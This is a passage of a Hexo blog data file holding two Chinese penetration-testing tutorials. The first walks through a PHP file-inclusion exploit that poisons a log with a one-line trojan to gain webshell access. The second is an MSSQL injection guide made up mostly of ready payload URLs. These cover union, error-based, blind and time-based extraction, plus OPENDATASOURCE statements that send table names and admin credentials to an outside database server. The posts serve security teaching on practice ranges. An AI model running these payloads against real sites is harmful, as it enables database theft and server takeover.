src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318151078-deac12cd-82b8-4966-8737-0103af237ad5.png#align=left&display=inline&height=208&margin=%5Bobject%20Object%5D&originHeight=551&originWidth=1099&status=done&style=none&width=415\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>文件包含，即包含代码文件。在开发WEB系统的过程中，同样的代码可能要在多个地方使用，例如登录后台之后需要检测用户是否登录，要实现的话需要在每一个后台文件都具有检测登录的代码，这样会导致代码很冗余，耗费了大量的人力物力而且还浪费了服务器资源。在这样的情况下，就开发出了文件包含函数，通过include()、require()、include_once()、require_once()函数，指定对应文件的路径，即可自动加载该文件的代码进行执行。<br>从开发层面来看，文件包含便利了代码的编写，但是如果没有进行很好地检测，就会产生任意文件包含漏洞。</p>\n<h2 id=\"本地文件包含和远程文件包含\"><a href=\"#本地文件包含和远程文件包含\" class=\"headerlink\" title=\"本地文件包含和远程文件包含\"></a>本地文件包含和远程文件包含</h2><p>       文件包含分为本地文件包含和远程文件包含。本地文件包含，LFI，只能包含服务器上的资源；远程文件包含，RFI，可以通过http协议包含互联网上的资源。<br>       开启文件包含功能需要在PHP的配置文件php.ini中进行设置：</p>\n<p>allow_url_fopen = On/off 表示开启或关闭本地文件包含功能<br>allow_url_include = On/Off 表示开启或关闭远程文件包含功能</p>\n<p>远程文件包含因为危害性更大，可以直接加载互联网上的文件，所以一般该功能是处于关闭状态的；而本地文件包含因为需要减轻代码负担，所以一般都是开启的。如图：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318142975-cfabd66e-c7d2-429c-ac6d-1e1ca5ed0742.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&originHeight=160&originWidth=839&status=done&style=none&width=415\"></p>\n<h2 id=\"文件包含函数\"><a href=\"#文件包含函数\" class=\"headerlink\" title=\"文件包含函数\"></a>文件包含函数</h2><p>文件包含函数有include()、include_once()、require()、require_once()。因为是拼接到代码进行执行，所以被文件包含的文件不论是什么后缀，包含之后都会被当作代码执行。在文件上传中，我们往往写入了一句话木马文件，但是因为白名单，二次渲染，重新更名等措施，使木马文件不能被当作代码执行，所以只是上传到服务器上了。如果服务器还存在文件包含漏洞，可以进行本地文件包含，那么将其包含的路径指定为木马文件，就可以执行了。</p>\n<p>文件包含函数之间的区别：<br>include() //如果被包含的文件不存在，网页报错，但是代码会继续执行<br>require() //如果被包含的文件不存在，网页报错，代码不会继续执行<br>include_once()和require_once()<br>本质上与include()和require()差别不大，就是在包含前查看是否已经包含过了，如果包含过一次了就不再继续包含。</p>\n<p>产生这样区别的原理是include和require调用文件的方式和时间不同：<br>include - PHP运行到include函数的位置然后去调用被包含的文件。<br>require - PHP在运行前，就先去把被包含的文件的内容提取出来，然后整合成一个新的PHP文件去执行。</p>\n<h2 id=\"漏洞-任意文件包含\"><a href=\"#漏洞-任意文件包含\" class=\"headerlink\" title=\"漏洞-任意文件包含\"></a>漏洞-任意文件包含</h2><p>       如果说单纯是文件包含，那么并不算是漏洞，因为只是包含了相应的代码文件，能够让代码执行的更加快捷，减轻了服务器压力。但是有的时候，因为业务的需要，或者在开发代码的时候为了文件包含的灵活，开发者会将文件包含函数包含的文件路径通过传参来实现。那么，如果我们控制了传参的内容指向我们需要的文件路径，就变成了任意文件包含漏洞，只要那个文件是一个包含了木马的文件，就可以直接获取服务器权限。</p>\n<h2 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h2><p>1、打开实例站点，这里看到是通过s参数加载模块回显页面的<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318143514-03a10597-d68e-484d-8647-bfb2118f62b4.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&originHeight=849&originWidth=1314&status=done&style=none&width=415\"><br>2、通过源代码审计工具对于站点源代码进行审计。发现在MyAction.class.php文件中通过id传参拼接my_进行加载模块处理。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144021-1fd9660e-5a45-488f-91fc-5230b91fd9be.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&originHeight=480&originWidth=1112&status=done&style=none&width=415\"><br>3、定位display函数，发现继续调用了fetch函数。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144659-0f034d91-7eda-431b-a42b-ebeec8a53875.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1064&status=done&style=none&width=415\"><br>4、继续追踪fetch函数，经分析发现经过了parseTemplateFile函数对其进行了处理，之后直接通过include()进行包含。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145056-d8c139ec-8701-48aa-9931-967cf2aeb98b.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1213&status=done&style=none&width=415\"><br>5、全文追踪找到parseTemplateFile函数，里面检测了模板文件名为空、模板文件名包含@、模板文件名包含：的情况，这些不影响进行文件包含。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145516-73fe323b-0c2a-4dc1-a298-50217a0f132d.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=1236&status=done&style=none&width=415\"><br>6、后面发现有个throw分支，需要能够返回变量templateFile，那么就不能进入该分支。定位函数file_exists_case。经分析可以发现这里是对文件名大小写进行判断的，并不影响传入目录进行包含。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146009-23cc3ea2-a3f8-48be-8f9c-94f135ac5c9e.png#align=left&display=inline&height=115&margin=%5Bobject%20Object%5D&originHeight=237&originWidth=856&status=done&style=none&width=415\"><br>7、现在漏洞点有了，但是进行包含需要一个含有一句话木马的文件。回到站点，在加载模块处加上任意信息让其报错，可以看到在页面中显示了错误信息提示模块不存在，并且输出了传入的aaaaaa。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146301-255c3a10-1929-4d4f-9ec1-b1a8484ed18f.png#align=left&display=inline&height=145&margin=%5Bobject%20Object%5D&originHeight=394&originWidth=1126&status=done&style=none&width=415\"><br>8、查看日志文件，发现日志文件名是通过固定的年_月_日进行命名的，并且文件内容将完整的错误信息记录了下来。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146626-9d687e34-3d1d-4881-ba2c-b43c3167113d.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&originHeight=267&originWidth=931&status=done&style=none&width=415\"><br>9、接下来就是想办法通过错误信息将一句话木马写入到日志文件。这里先传了常规的一句话，发现错误信息并没有加载该一句话。不要紧，查看日志文件发现，已经成功写入了一句话木马。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147241-16dd66a9-f0e5-40f7-be7f-719f580438cf.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&originHeight=400&originWidth=1007&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147808-26ccb09e-7ee1-4573-a5de-6543b6d22b6d.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=404&originWidth=990&status=done&style=none&width=415\"><br>10、包含该日志文件，成功输出了里面的内容了，但是当我通过传参1执行phpinfo()函数的时候发现页面没有响应。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148361-358ea321-9040-4bc6-9f79-77102066a9ed.png#align=left&display=inline&height=123&margin=%5Bobject%20Object%5D&originHeight=332&originWidth=1122&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148740-eb30ee42-ff9d-48aa-a1a2-b148721c757b.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=452&originWidth=1076&status=done&style=none&width=415\"><br>11、查看网页url发现我的输入被网站更改了，变成/0/phpinfo()%3B/，应该是传参1在网站后台有记录，是确实存在的，那么重新传一句话木马，此时设置php的传参为aaa。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149233-e2b56e29-5059-418a-9009-53024089fa38.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&originHeight=429&originWidth=1033&status=done&style=none&width=415\"><br>12、在加载模块处拼接日志文件再通过&amp;传参aaa=phpinfo();，发现页面成功输出了phpinfo的函数内容。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149754-5a507cec-b0c0-4f11-8aca-6f52f8f9cace.png#align=left&display=inline&height=337&margin=%5Bobject%20Object%5D&originHeight=960&originWidth=1182&status=done&style=none&width=415\"><br>13、通过菜刀WEBshell管理工具拿下服务器权限。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150289-82aae539-c225-471b-b6ac-e148f15d311f.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&originHeight=375&originWidth=625&status=done&style=none&width=375\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150780-2d387c11-b081-4491-a7ae-dc0baf84b7ee.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&originHeight=619&originWidth=1179&status=done&style=none&width=415\"><br>14、执行系统命令获取当前用户名以及系统信息。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318151078-deac12cd-82b8-4966-8737-0103af237ad5.png#align=left&display=inline&height=208&margin=%5Bobject%20Object%5D&originHeight=551&originWidth=1099&status=done&style=none&width=415\"></p>\n"},{"title":"MSSQL数据库注入全方位利用","keywords":"数据库,web安全,mssql,sql注入","description":"MSSQL数据库注入全方位利用","cover":"https://p5.ssl.qhimg.com/t0181df866952842a55.png","date":"2021-02-02T02:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n>本文由ajie原创发布\n>转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/248896\n>安全客 - 有思想的安全新媒体\n\n# 0x01 前言\n\n在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～\n\n# 0x02 注入前准备\n\n## 1、确定注入点\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 and 1=1\n```\n![](https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 and 1=2\n```\n![](https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png)\n\n## 2、判断是否为mssql数据库\n\nsysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)>0\n```\n\n![](https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png)\n还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY '00:00:10'; -- asd\n```\n\n![](https://p4.ssl.qhimg.com/t0196919ac7c368e603.png)\n\n## 3、相关概念\n\n### 系统自带库\n\nMSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。\n这里了解一下系统级库：\n```\nmaster：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。\nmodel：模版数据库\ntempdb：临时容器\nmsdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。\n```\n### 系统自带表\n\nMSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。\n```\nsysobjects：记录了数据库中所有表，常用字段为id、name和xtype。\nsyscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。\n```\n就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个'U'为用户所创建，一个'S'为系统所创建。其他对象类型如下：\n```php\n对象类型：\nAF = 聚合函数 (CLR)\nC = CHECK 约束\nD = DEFAULT（约束或独立）\nF = FOREIGN KEY 约束\nFN = SQL 标量函数\nFS = 程序集 (CLR) 标量函数\nFT = 程序集 (CLR) 表值函数\nIF = SQL 内联表值函数\nIT = 内部表\nP = SQL 存储过程\nPC = 程序集 (CLR) 存储过程\nPG = 计划指南\nPK = PRIMARY KEY 约束\nR = 规则（旧式，独立）\nRF = 复制筛选过程\nS = 系统基表\nSN = 同义词\nSQ = 服务队列\nTA = 程序集 (CLR) DML 触发器\nTF = SQL 表值函数\nTR = SQL DML 触发器\nU = 表（用户定义类型）\nUQ = UNIQUE 约束\nV = 视图\nX = 扩展存储过程\n```\n\n### 排序&获取下一条数据\n\nmssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用<>或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上('')，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：\n\n```php\n#使用<>获取数据\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name<>'id' and name<>'username'-- qwe\n#使用not in获取数据\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe\n```\n\n![](https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png)\n\n### 堆叠注入\n\n在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。\n\n```php\nhttp://192.168.150.4:9001/less-1.asp?id=1';WAITFOR DELAY '0:0:5';-- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t0181df866952842a55.png)\n\n# 0x03 显错注入\n\n## 1、判断当前字段数\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 order by 4\n```\n\n![](https://p5.ssl.qhimg.com/t0163e343ea44015455.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 order by 5\n```\n\n![](https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png)\n通过order by报错情况，可以判断出当前字段为4。\n\n## 2、联合查询，获取显错点\n\n1、首先因为不知道具体类型，所以还是先用null来填充字符\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe\n```\n![](https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png)\n2、替换null为'null'，获取显错点\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'null','null',null -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png)\n当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select 'null','null','null',null -- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t0100837f900c3ef729.png)\n\n## 3、通过显错点获取数据库信息\n\n1、获取数据库版本\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select @@version),null -- qwe\n```\n\n![](https://p4.ssl.qhimg.com/t012f189779bf95f529.png)\n2、查询当前数据库名称\n通过轮询db_name(*)里*的内容，获取所有数据库库名\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(5)),null -- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png)\n![](https://p4.ssl.qhimg.com/t01409617b57bcdb809.png)\n3、查询当前用户\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select user),null -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01e868a65736530e91.png)\n\n\n## 4、查询表名\n\n查询dbo.sysobjects表中用户创建的表，获取其对应的id和name\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype='U' -- qwe\n```\n\n![](https://p4.ssl.qhimg.com/t0125721234db891a35.png)\n查询下一个表名\n\n```php\n#使用<>获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id <> 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id not in ('5575058') -- qwe\n```\n\n![](https://p4.ssl.qhimg.com/t011661598555b1c380.png)\n\n## 5、查询列名\n\n这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058'-- qwe\n```\n\n![](https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t01a8944599c209006a.png)\n\n## 6、information_schema\n\n值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 table_name from information_schema.tables where table_name <> 'manager'),null -- qwe\n```\n\n![](https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' and column_name not in ('id','username')),null -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png)\n![](https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png)\n\n\n## 7、获取数据\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username <> 'admin_mz'-- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png)\n解密获取密码\n![](https://p2.ssl.qhimg.com/t016cb243729a0f493a.png)\n\n# 0x04 报错注入\n\nmssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。\n\n## 1、直接报错\n\n等号两边数据类型不一致配合子查询获取数据。\n\n```php\n#获取数据库库名?id=1' and 1=(select db_name()) -- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png)\n\n```php\n#获取第一个表名?id=1' and 1=(select top 1 name from dbo.sysobjects) -- qwe\n```\n\n![](https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png)\n\n```php\n#将数据连接显示?id=1'  and 1=stuff((select db_name() for xml path('')),1,0,'')--+\n```\n\n## 2、convert()函数\n\n```php\nconvert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。\n```\n\n具体用法如下：\n\n```php\n#获取数据库库名?id=1' and 1=convert(int,(select db_name())) -- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png)\n\n```php\n#获取数据库版本?id=1' and 1=convert(int,(select @@version))) -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png)\n\n## 3、cast()函数\n\n```php\nCAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。\n```\n\n具体用法如下：\n\n```php\n#查询当前数据库?id=1' and 1=(select cast(db_name() as int)) -- qe\n```\n\n![](https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png)\n\n```php\n#查询第一个数据表?id=1' and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe\n```\n\n![](https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png)\n\n## 4、数据组合输出\n\n```php\n#将数据表组合输出?id=1' and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path('')),1,0,'')--+\n```\n\n![](https://p0.ssl.qhimg.com/t0126a37aad232cde94.png)\n\n```php\n#查询users表中的用户名并组合输出?id=1'  and 1=stuff((select quotename(username) from users for xml path('')),1,0,'')--+\n```\n\n![](https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png)\n\n# 0x05 布尔盲注\n\n## 1、查询数据库库名\n\n1、查询数据库库名长度为11\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11\n```\n\n![](https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png)\n2、查询第一个字符的ascii码为109\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))>109\n```\n\n![](https://p5.ssl.qhimg.com/t0116e04363840e9a62.png)\n![](https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png)\n3、查询第二个字符的ascii码为111\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111\n```\n\n![](https://p5.ssl.qhimg.com/t01e337930ebb104e75.png)\n4、获取所有ascii码之后，解码获取数据\n![](https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png)\n\n## 2、查询表名\n\n除了像上面查询库名使用了ascii码外，还可以直接猜解字符串\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m'\n```\n\n![](https://p1.ssl.qhimg.com/t019bb4ff316062345b.png)\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,6)='manage'\n```\n\n![](https://p5.ssl.qhimg.com/t017026272920723c8d.png)\n\n# 0x06 延时盲注\n\n## 1、延时函数 WAITFOR DELAY\n\n```php\n语法：n表示延时几秒WAITFOR DELAY '0:0:n'id=1 if (布尔盲注的判断语句) WAITFOR DELAY '0:0:5' -- qwe\n```\n\n## 2、查询数据\n\n```php\n#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY '0:0:5' -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t018900c2d899e6edae.png)\n\n```php\n#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m') WAITFOR DELAY '0:0:5' -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png)\n\n\n# 0x07 反弹注入\n\n就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。\n反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。\n反弹注入需要使用opendatasource函数。\n\n```php\nOPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。\n```\n\n```php\n申请免费云服务器：香港云：http://www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/\n```\n\n## 1、环境准备\n\n1、首先打开靶场\n![](https://p3.ssl.qhimg.com/t0125c9c6371197c223.png)\n3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。\n\n```php\nCREATE TABLE test(name VARCHAR(255))\n```\n\n![](https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png)\n\n## 2、获取数据库所有表\n\n1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。\n\n```php\n#查询sysobjects表?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype='U' -- qwe#查询information_schema数据库?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe\n```\n\n2、执行成功页面返回正常。\n![](https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png)\n3、在数据库中成功获取到数据。\n![](https://p2.ssl.qhimg.com/t014a5c058780e87669.png)\n\n## 3、获取数据库admin表中的所有列名\n\n```php\n#查询information_schema数据库?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name='admin'-- qwe#查询syscolumns表?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t018c0e415a5ac7d536.png)\n![](https://p1.ssl.qhimg.com/t01957478eb17de4d8a.png)\n\n## 4、获取数据\n\n1、首先新建一个表，里面放三个字段，分别是id，username和passwd。\n\n```php\nCREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255))\n```\n\n2、获取admin表中的数据\n\n```php\n?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png)\n![](https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png)\n\n# 0x08 总结\n\n\t完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。\n\t\n\t靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～\n","source":"_posts/MSSQL数据库注入全方位利用.md","raw":"---\ntitle: MSSQL数据库注入全方位利用\ntags: \n  - 数据库\n  - SQL注入\n  - Sql Server\ncategories: web安全\nkeywords: '数据库,web安全,mssql,sql注入'\ndescription: MSSQL数据库注入全方位利用\ncover: https://p5.ssl.qhimg.com/t0181df866952842a55.png\ndate: 2021-02-02 10:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n>本文由ajie原创发布\n>转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/248896\n>安全客 - 有思想的安全新媒体\n\n# 0x01 前言\n\n在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～\n\n# 0x02 注入前准备\n\n## 1、确定注入点\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 and 1=1\n```\n![](https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 and 1=2\n```\n![](https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png)\n\n## 2、判断是否为mssql数据库\n\nsysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from 